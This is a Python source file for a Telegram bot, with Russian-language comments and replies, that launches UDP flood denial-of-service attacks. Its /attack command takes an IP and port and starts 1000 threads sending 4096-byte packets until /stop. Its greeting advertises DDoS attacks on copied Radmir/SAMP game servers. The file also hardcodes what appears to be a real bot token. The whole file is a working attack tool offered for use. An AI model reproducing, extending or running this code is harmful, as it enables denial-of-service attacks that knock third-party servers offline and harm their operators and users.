import os
import logging
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes
import threading
import socket
import time

# Параметры атаки
packet_size = 4096
num_threads = 1000
interval = 0.05     # Интервал между отправками пакетов (в секундах)

# Переменные для управления атакой
server_ip = ""
server_port = 0
message = b""
threads = []
attack_running = False

def create_packet(size):
    return bytes([0] * size)

async def send_packets(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global attack_running, server_ip, server_port
    if attack_running:
        await update.message.reply_text("Атака уже запущена!")
        return

    try:
        # Получаем параметры из команды
        server_ip = context.args[0]
        server_port = int(context.args[1])

        message = create_packet(packet_size)

        # Запуск потоков
        attack_running = True
        threads.clear()

        def thread_target():
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            while attack_running:
                sock.sendto(message, (server_ip, server_port))
                time.sleep(interval)
            sock.close()

        for _ in range(num_threads):
            thread = threading.Thread(target=thread_target)
            thread.start()
            threads.append(thread)

        await update.message.reply_text(f"Атака на {server_ip}:{server_port} запущена!")

    except Exception as e:
        await update.message.reply_text(f"Произошла ошибка: {e}")

async def stop_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global attack_running
    if not attack_running:
        await update.message.reply_text("Атака не запущена.")
        return
    attack_running = False
    for thread in threads:
        thread.join()
    threads.clear()
    await update.message.reply_text("Атака остановлена.")

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Привет! Я могу помочь с запуском DDoS-атаки на сервера копий радмира/самп сервера.")

async def help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("""
Команды:
  /start - Приветственное сообщение.
  /attack <IP> <Порт> - Запуск атаки.
  /stop - Остановить атаку.
  /help - Получить помощь.
""")

def main():
    logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
                        level=logging.INFO)
    logger = logging.getLogger(__name__)

    token = "7876025147:AAHaGOLsjaiKFxKOVjdyRYP-GbfD83kfPXA"  # Ваш токен

    # Создание объекта Application для бота
    application = Application.builder().token(token).build()

    # Обработчики команд
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help))
    application.add_handler(CommandHandler("attack", send_packets))
    application.add_handler(CommandHandler("stop", stop_attack))

    # Запуск бота
    application.run_polling()

if __name__ == "__main__":
    main()